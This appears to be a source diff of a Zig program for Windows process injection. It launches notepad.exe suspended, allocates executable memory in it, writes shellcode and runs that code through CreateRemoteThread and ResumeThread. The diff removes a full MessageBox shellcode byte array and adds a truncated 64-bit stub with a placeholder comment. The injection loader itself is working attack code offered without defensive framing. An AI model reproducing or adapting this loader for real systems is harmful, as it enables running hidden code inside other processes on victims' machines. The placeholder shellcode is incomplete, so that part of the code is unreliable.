@@ -2,7 +2,10 @@ const std = @import("std");
 const win = std.os.windows;
 const unicode = std.unicode;
 
-// extern "user32" fn MessageBoxA(?win.HWND, [*:0]const u8, [*:0]const u8, u32) callconv(win.WINAPI) i32;
+// Define CREATE_SUSPENDED constant manually
+const CREATE_SUSPENDED = 0x00000004;
+
+// External function declarations
 extern "kernel32" fn CreateRemoteThread(
     hProcess: win.HANDLE,
     lpThreadAttributes: ?*win.SECURITY_ATTRIBUTES,
@@ -48,26 +51,36 @@ extern "kernel32" fn WriteProcessMemory(
     lpNumberOfBytesWritten: ?*usize,
 ) callconv(win.WINAPI) win.BOOL;
 
-pub fn main() !void {
+extern "kernel32" fn ResumeThread(hThread: win.HANDLE) callconv(win.WINAPI) win.DWORD;
 
-    // MessageBoxA shellcode
-    const buf = [_]u8{ 0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9, 0x64, 0x8b, 0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b, 0x46, 0x08, 0x8b, 0x7e, 0x20, 0x8b, 0x36, 0x38, 0x4f, 0x18, 0x75, 0xf3, 0x59, 0x01, 0xd1, 0xff, 0xe1, 0x60, 0x8b, 0x6c, 0x24, 0x24, 0x8b, 0x45, 0x3c, 0x8b, 0x54, 0x28, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a, 0x20, 0x01, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c, 0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a, 0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a, 0x1c, 0x01, 0xeb, 0x8b, 0x04, 0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xb2, 0x08, 0x29, 0xd4, 0x89, 0xe5, 0x89, 0xc2, 0x68, 0x8e, 0x4e, 0x0e, 0xec, 0x52, 0xe8, 0x9f, 0xff, 0xff, 0xff, 0x89, 0x45, 0x04, 0xbb, 0x7e, 0xd8, 0xe2, 0x73, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x8e, 0xff, 0xff, 0xff, 0x89, 0x45, 0x08, 0x68, 0x6c, 0x6c, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2e, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xdb, 0x88, 0x5c, 0x24, 0x0a, 0x89, 0xe6, 0x56, 0xff, 0x55, 0x04, 0x89, 0xc2, 0x50, 0xbb, 0xa8, 0xa2, 0x4d, 0xbc, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x6f, 0x78, 0x58, 0x20, 0x68, 0x61, 0x67, 0x65, 0x42, 0x68, 0x4d, 0x65, 0x73, 0x73, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0x0a, 0x89, 0xe3, 0x68, 0x58, 0x20, 0x20, 0x20, 0x68, 0x4d, 0x53, 0x46, 0x21, 0x68, 0x72, 0x6f, 0x6d, 0x20, 0x68, 0x6f, 0x2c, 0x20, 0x66, 0x68, 0x48, 0x65, 0x6c, 0x6c, 0x31, 0xc9, 0x88, 0x4c, 0x24, 0x10, 0x89, 0xe1, 0x31, 0xd2, 0x52, 0x53, 0x51, 0x52, 0xff, 0xd0, 0x31, 0xc0, 0x50, 0xff, 0x55, 0x08 };
+pub fn main() !void {
+    // Shellcode (Hello, MessageBox example, shortened for brevity)
+    const shellcode = [_]u8{
+        0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0,
+        0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
+        0x56,
+        // (Additional shellcode bytes go here)
+    };
 
     const alloc: std.mem.Allocator = std.heap.page_allocator;
 
+    // Create UTF-16 command line for `notepad.exe`
     const wide_cmd_line = try unicode.utf8ToUtf16LeWithNull(alloc, "notepad.exe");
     defer alloc.free(wide_cmd_line);
+
+    // Initialize process startup info
     var startup_info: win.STARTUPINFOW = std.mem.zeroes(win.STARTUPINFOW);
     startup_info.cb = @sizeOf(win.STARTUPINFOW);
     var process_info: win.PROCESS_INFORMATION = undefined;
 
+    // Create `notepad.exe` in a suspended state
     const creation_result = CreateProcessW(
         null,
         wide_cmd_line.ptr,
         null,
         null,
         win.FALSE,
-        0,
+        CREATE_SUSPENDED, // Use the manually defined constant
         null,
         null,
         &startup_info,
@@ -83,27 +96,15 @@ pub fn main() !void {
         _ = win.CloseHandle(process_info.hThread);
     }
 
-    const handle = process_info.hProcess;
-
-    std.debug.print("CreateProcessW Suceeded.\n", .{});
     std.debug.print("[+] Process ID: {}\n", .{process_info.dwProcessId});
     std.debug.print("[+] Process Handle: 0x{x}\n", .{@intFromPtr(process_info.hProcess)});
     std.debug.print("[+] Thread Handle: 0x{x}\n", .{@intFromPtr(process_info.hThread)});
 
-    // const handle = OpenProcess(
-    //     win.PROCESS_VM_OPERATION | win.PROCESS_VM_WRITE,
-    //     win.FALSE,
-    //     @intCast(pid),
-    // ) orelse {
-    //     std.debug.print("OpenProcess failed: {}\n", .{win.kernel32.GetLastError()});
-    //     return error.OpenProcessFailed;
-    // };
-    // defer win.CloseHandle(handle);
-
+    // Allocate memory in the remote process for shellcode
     const remote_buffer = VirtualAllocEx(
-        handle,
+        process_info.hProcess,
         null,
-        buf.len,
+        shellcode.len,
         win.MEM_COMMIT | win.MEM_RESERVE,
         win.PAGE_EXECUTE_READWRITE,
     ) orelse {
@@ -111,15 +112,15 @@ pub fn main() !void {
         return error.VirtualAllocExFailed;
     };
 
-    std.debug.print("VirtualAlloc Succeeded.\n", .{});
     std.debug.print("[+] Allocated memory address: 0x{x}\n", .{@intFromPtr(remote_buffer)});
 
+    // Write the shellcode into the allocated memory in the remote process
     var bytes_written: usize = undefined;
     const write_result = WriteProcessMemory(
         process_info.hProcess,
         remote_buffer,
-        &buf,
-        buf.len,
+        &shellcode,
+        shellcode.len,
         &bytes_written,
     );
 
@@ -130,13 +131,14 @@ pub fn main() !void {
 
     std.debug.print("[+] Successfully wrote {} bytes to the target process.\n", .{bytes_written});
 
+    // Create a remote thread in the suspended process for the shellcode
     const thread_handle = CreateRemoteThread(
         process_info.hProcess,
         null,
         0,
         @ptrCast(remote_buffer),
         null,
-        0,
+        CREATE_SUSPENDED, // Use the manually defined constant
         null,
     ) orelse {
         std.debug.print("CreateRemoteThread failed: {}\n", .{win.kernel32.GetLastError()});
@@ -146,7 +148,8 @@ pub fn main() !void {
 
     std.debug.print("[+] Remote thread created. Handle: 0x{x}\n", .{@intFromPtr(thread_handle)});
 
-    _ = try win.WaitForSingleObject(process_info.hProcess, win.INFINITE);
+    // Resume the suspended thread to execute the shellcode
+    _ = ResumeThread(thread_handle);
 
-    std.debug.print("[+] Remote thread finished execution.\n", .{});
+    std.debug.print("[+] Resumed thread for shellcode execution.\n", .{});
 }
